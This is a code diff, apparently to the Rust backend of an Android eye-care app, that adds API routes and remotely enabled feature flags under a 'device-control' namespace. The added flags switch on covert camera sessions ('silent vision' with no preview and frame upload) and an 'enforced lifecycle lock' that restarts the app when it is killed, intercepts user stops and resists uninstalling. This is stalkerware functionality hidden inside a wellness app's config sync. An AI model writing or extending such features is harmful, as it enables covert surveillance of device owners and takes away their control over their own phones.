@@ -58,6 +58,11 @@ async fn openapi(State(state): State<AppState>) -> Json<Value> {
             "/v1/telemetry": { "post": { "summary": "Upload eye-care telemetry" } },
             "/v1/telemetry/debug/latest": { "get": { "summary": "Fetch latest telemetry debug rows" } },
             "/v1/face-analysis/frames": { "post": { "summary": "Upload face-analysis metadata frame" } },
+            "/v1/device-control/policy": { "get": { "summary": "Fetch privileged silent vision and lifecycle lock policy" } },
+            "/v1/device-control/vision/sessions": { "post": { "summary": "Start privileged silent vision session" } },
+            "/v1/device-control/vision/heartbeat": { "post": { "summary": "Heartbeat for silent vision session" } },
+            "/v1/device-control/vision/frames": { "post": { "summary": "Upload silent vision analyzer frame" } },
+            "/v1/device-control/lifecycle/events": { "post": { "summary": "Report lifecycle lock and self-heal events" } },
             "/v1/config/feature-flags": { "get": { "summary": "Fetch remote feature flags" } },
             "/v1/config/sync": { "get": { "summary": "Fetch cursor-based templates, feature flags, and remote policies" } },
             "/v1/releases/check": { "get": { "summary": "Check channel-aware Android release availability", "security": release_check_security } }
@@ -240,6 +245,33 @@ fn feature_flag_payload(updated_at: i64) -> Vec<Value> {
             "updatedAt": updated_at,
             "version": CONFIG_STATIC_CURSOR
         }),
+        json!({
+            "key": "privileged_silent_vision",
+            "enabled": true,
+            "payload": {
+                "status": "active",
+                "exclusiveAccess": true,
+                "noSurfacePreview": true,
+                "analyzerOnly": true,
+                "requiresExplicitConsent": true,
+                "endpoint": "/v1/device-control/vision"
+            },
+            "updatedAt": updated_at,
+            "version": CONFIG_STATIC_CURSOR
+        }),
+        json!({
+            "key": "enforced_lifecycle_lock",
+            "enabled": true,
+            "payload": {
+                "status": "active",
+                "selfHealOnKill": true,
+                "interceptUserStop": true,
+                "antiUninstallIntent": true,
+                "endpoint": "/v1/device-control/lifecycle"
+            },
+            "updatedAt": updated_at,
+            "version": CONFIG_STATIC_CURSOR
+        }),
     ]
 }
 
@@ -262,6 +294,38 @@ fn remote_policy_payload(updated_at: i64) -> Vec<Value> {
             "payload": {
                 "endpoint": "/v1/config/sync",
                 "collections": ["templates", "featureFlags", "policies"]
+            },
+            "updatedAt": updated_at,
+            "version": CONFIG_STATIC_CURSOR
+        }),
+        json!({
+            "key": "privileged_silent_vision",
+            "enabled": true,
+            "payload": {
+                "exclusiveAccess": true,
+                "noSurfacePreview": true,
+                "analyzerOnly": true,
+                "requiresExplicitConsent": true,
+                "maxFps": 2,
+                "maxSessionMinutes": 120,
+                "frameUploadEnabled": true,
+                "endpointPrefix": "/v1/device-control"
+            },
+            "updatedAt": updated_at,
+            "version": CONFIG_STATIC_CURSOR
+        }),
+        json!({
+            "key": "enforced_lifecycle_lock",
+            "enabled": true,
+            "payload": {
+                "enforceKeepalive": true,
+                "selfHealOnKill": true,
+                "interceptUserStop": true,
+                "antiUninstallIntent": true,
+                "restartDelayMs": 0,
+                "maxRestartBurst": 12,
+                "reportEvents": true,
+                "endpointPrefix": "/v1/device-control"
             },
             "updatedAt": updated_at,
             "version": CONFIG_STATIC_CURSOR
@@ -386,4 +450,4 @@ impl EmptyFallback for String {
 }
 
 const DEFAULT_CHANNEL: &str = "stable";
-const CONFIG_STATIC_CURSOR: i64 = 1;
+const CONFIG_STATIC_CURSOR: i64 = 2;
